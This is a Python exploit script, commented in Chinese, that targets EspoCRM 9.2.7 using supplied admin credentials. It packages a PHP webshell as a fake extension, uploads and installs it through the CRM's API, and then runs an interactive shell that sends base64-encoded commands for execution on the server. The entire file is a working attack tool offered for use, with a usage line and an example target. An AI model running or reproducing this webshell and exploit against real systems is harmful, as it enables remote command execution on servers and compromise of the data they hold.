#!/usr/bin/env python3
"""
EspoCRM 9.2.7 GetShell
用法: python3 espocrm_getshell.py <URL> <用户名> <密码>
"""

import base64, io, json, sys, zipfile, requests

requests.packages.urllib3.disable_warnings()

def create_extension():
    """创建恶意Extension包"""
    manifest = {
        "name": "Ext",
        "version": "1.0.0",
        "acceptableVersions": [">=7.0.0"],
        "releaseDate": "2026-01-01",
        "author": "x",
        "description": "x"
    }
    
    webshell = '''<?php
namespace Espo\\Custom\\Controllers;
use Espo\\Core\\Api\\Request;
class Sh {
    public function getActionX(Request $r) {
        $c = $r->getQueryParam('c');
        return $c ? ['o' => shell_exec(base64_decode($c).' 2>&1')] : ['s' => 1];
    }
}
'''
    
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as z:
        z.writestr('manifest.json', json.dumps(manifest))
        z.writestr('files/custom/Espo/Custom/Controllers/Sh.php', webshell)
    return buf.getvalue()

def exploit(url, user, pwd):
    url = url.rstrip('/')
    auth = (user, pwd)
    s = requests.Session()
    s.verify = False
    
    print(f"[*] 目标: {url}")
    
    # 上传
    print("[*] 上传Extension...")
    data = f"data:application/octet-stream;base64,{base64.b64encode(create_extension()).decode()}"
    r = s.post(f"{url}/api/v1/Extension/action/upload", auth=auth,
               headers={"Content-Type": "application/json"}, data=json.dumps(data), timeout=30)
    
    if r.status_code != 200:
        print(f"[-] 上传失败: {r.status_code}")
        return
    
    ext_id = r.json().get('id')
    print(f"[+] 上传成功: {ext_id}")
    
    # 安装
    print("[*] 安装Extension...")
    r = s.post(f"{url}/api/v1/Extension/action/install", auth=auth,
               headers={"Content-Type": "application/json"}, json={"id": ext_id}, timeout=60)
    
    if r.status_code != 200:
        print(f"[-] 安装失败: {r.status_code}")
        return
    
    print("[+] 安装成功!")
    
    # Shell
    shell_url = f"{url}/api/v1/Sh/action/x"
    print(f"[+] Webshell: {shell_url}?c=<base64_cmd>")
    print("\n" + "="*50)
    print("        EspoCRM Shell")
    print("="*50)
    
    while True:
        try:
            cmd = input("\nshell> ").strip()
            if not cmd:
                continue
            if cmd.lower() in ['exit', 'quit', 'q']:
                break
            
            r = s.get(shell_url, auth=auth, params={"c": base64.b64encode(cmd.encode()).decode()}, timeout=30)
            if r.status_code == 200:
                print(r.json().get('o', ''))
            else:
                print(f"[!] Error: {r.status_code}")
                
        except KeyboardInterrupt:
            print("\n[*] Bye")
            break
        except Exception as e:
            print(f"[!] {e}")

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print(f"用法: python3 {sys.argv[0]} <URL> <用户名> <密码>")
        print(f"示例: python3 {sys.argv[0]} http://target admin password123")
        sys.exit(1)
    
    exploit(sys.argv[1], sys.argv[2], sys.argv[3])
